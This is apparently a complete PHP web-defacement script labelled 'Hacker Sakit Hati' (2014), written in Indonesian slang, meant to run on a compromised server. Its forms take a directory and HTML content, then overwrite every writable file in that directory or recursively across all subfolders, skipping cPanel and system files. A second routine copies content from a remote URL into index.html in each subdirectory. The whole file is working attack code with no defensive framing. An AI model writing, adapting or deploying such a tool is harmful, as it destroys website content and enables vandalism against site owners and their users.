 <?php

$HackerSakitHati = 

//////////////////////// general /////
  set_time_limit(0);
 $dir=$_POST['dir'];
   $index = $_POST["index"];
   $index = str_replace('"',"'",$index);
   $index = stripslashes($index);

////////////////functions //////////////////


 function edit_file($file,$index){
if (is_writable($file)) {
     clear_fill($file,$index);
    echo "<Span style='color:green;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
} else {
   echo "<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( </strong></span><br></center>";
}
}
//////////////////////////////////////////

function clear_fill($file,$index){
    if(file_exists($file)){
        $handle = fopen($file,'w');
        fwrite($handle,'');
        fwrite($handle,$index);
        fclose($handle);  } }
///////////////////////////
function do_it(){
  global $dir , $index ;
   chdir($dir);
   $me = str_replace(dirname(__FILE__).'/','',__FILE__);
   $files = scandir($dir) ;
   $notallow = array(".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","..",".");
   sort($files);
   $n = 0 ;
   foreach ($files as $file){
        if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
            echo "<center><Span style='color: #8A8A8A;'><strong>$dir/</span>$file</strong> ====> ";
            edit_file($file,$index);
            flush();
            $n = $n +1 ;
              } }
              echo "<br>";
              echo "<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";
                }

//////////////////////////////
function ListFiles($dirall) {

    if($dh = opendir($dirall)) {

       $files = Array();
       $inner_files = Array();
       $me = str_replace(dirname(__FILE__).'/','',__FILE__);
       $notallow = array($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
        while($file = readdir($dh)) {
            if($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow) ) {
                if(is_dir($dirall . "/" . $file)) {
                    $inner_files = ListFiles($dirall . "/" . $file);
                    if(is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, $dirall . "/" . $file);
                }
            }
        }

        closedir($dh);
        return $files;
    }
}
 //////////////////////////////////////////
 function do_it_all(){
   global $index ;
  $dirall=$_POST['dir'];
foreach (ListFiles($dirall) as $key=>$file){
    $file = str_replace('//',"/",$file);
    echo "<center><strong>$file</strong> ===>";
    edit_file($file,$index);
    flush();
}
$key = $key+1;
echo "<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>"; }

/////////////// starting //////////////////
if ($_POST['indexit'])
{
          if ($_POST['option']=="Sabun Massal Di Tempat"){ do_it() ;}
          elseif ($_POST['option']=="Sabun Massal Bunuh diri"){ do_it_all(); }
          else {echo $error;}
}


echo "<center><textarea name='code' rows='5' cols='67' style='background:#000000;color:aqua;border:2px;background-image:url(http://4.bp.blogspot.com/-RbaCuWyoN3c/U9-IWbh17wI/AAAAAAAAAto/I8zpRHIP0Gg/s1600/kbk29185-227a592.gif);background-repeat:repeat;background-position:top;background-attachment: fixed;'>";
$defaceurl = $_POST['massdefaceurl'];
$dir = $_POST['massdefacedir'];
echo $dir."\n";
 
if (is_dir($dir)) {
    if ($dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
                        if(filetype($dir.$file)=="dir"){
                                $newfile=$dir.$file."/index.html";
                                echo $newfile."\n";
                                if (!copy($defaceurl, $newfile)) {
                                        echo "Oraiso Cok!! $file...\n";
                                }
                        }
        }
        closedir($dh);
    }
}
echo "</textarea></center>";


?><br><center>
<strong>xXx ||   MAIN SABUN   || xXx <br></strong>
<form action='<?php basename($_SERVER['PHP_SELF']); ?>' method='post'>
[+] Main Sabun : <input type='text' style='width: 444px' value='<?php  echo getcwd() . "/"; ?>' name='massdefacedir'><br>
[+] Sabun Masal : <input type='text' style='width: 438px' name='massdefaceurl'><br>
<input type='submit' name='execmassdeface' value=' Silahkan Disabun '></form></td>
<br>
<div id="result">
<form method='post'>
<center>
			<strong> |||||||||||||||||||||  Main Sabun Di Room - VIP  ||||||||||||||||||||| <<br></strong>
			<input name='dir' class="code" style='width: 525px' type='text' value="<? echo getcwd(); ?>"><br><br><strong>Tempat Lokasi Penyabunan<br></strong>
			<textarea placeholder='Silahkan Menyiapkan Sabun Kesukaan Anda !! ^_^ ' class="evalcode" name='index' style='width: 520px; height: 100px; background:# ;color:black ;'></textarea><br><br>
			<strong>Pilihan Menu Sabun<br></strong>
			<select class="code" name='option' style='width: 202px'>
			<option>Sabun Massal Di Tempat </option>
			<option>Sabun Massal Bunuh diri</option>
			</select><br>

			<p><input type="submit" name="indexit" class="inputzbut" value="Silahkan Disabun " style="width:120px;height:30px;" /></p>

			


<style type='text/css'>
body,table{background:  ; font-family:Verdana,tahoma; color: white ; font-size:10px }
A:link {text-decoration: none;color: aqua;}
A:active {text-decoration: none;color: aqua;}
A:visited {text-decoration: none;color: lime;}
A:hover {text-decoration: underline; color: Fuchsia;}
#new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;}
input:hover,tr:hover,td:hover{background-color:  ; color: aqua;}

 .inputzbut:hover{border:1px solid white;}
</style>
<title>Hacker Sakit Hati </title><center>
<div id="result">
<br />
<script language="JavaScript1.2">
var message=" ..::[+  Copyright © 2014 Hacker Sakit Hati   +]::..  "// jangan pakai enter
var neonbasecolor=" aqua "
var neontextcolor=" white "
var neontextcolor2="pink"  // kode warna kedua
var flashspeed=1	// kecepatan flash neon, semakin kecil semakin cepat
var flashingletters=10	// jumlah huruf yang tersorot oleh flash
var flashingletters2=2	// jumlah warna di ekor flash
var flashpause=1					
///edit by http://googel-indonesia.blogspot.com/
var n=0
if (document.all||document.getElementById){
document.write('<font color="'+neonbasecolor+'">')
for (m=0;m<message.length;m++)
document.write('<span id="neonlight'+m+'">'+message.charAt(m)+'</span>')
document.write('</font>')
}
else
document.write(message)
function crossref(number){
var crossobj=document.all? eval("document.all.neonlight"+number) : document.getElementById("neonlight"+number)
return crossobj
}
function neon(){
//Change all letters to base color
if (n==0){
for (m=0;m<message.length;m++)
crossref(m).style.color=neonbasecolor
}
//cycle through and change individual letters to neon color
crossref(n).style.color=neontextcolor

if (n>flashingletters-1) crossref(n-flashingletters).style.color=neontextcolor2 
if (n>(flashingletters+flashingletters2)-1) crossref(n-flashingletters-flashingletters2).style.color=neonbasecolor
if (n<message.length-1)
n++
else{
n=0
clearInterval(flashing)
setTimeout("beginneon()",flashpause)
return
}
}
function beginneon(){
if (document.all||document.getElementById)
flashing=setInterval("neon()",flashspeed)
}
beginneon()
</script>
	


</div></center>			
			
			
			
			
			</form>
</div></style></th></div></body>
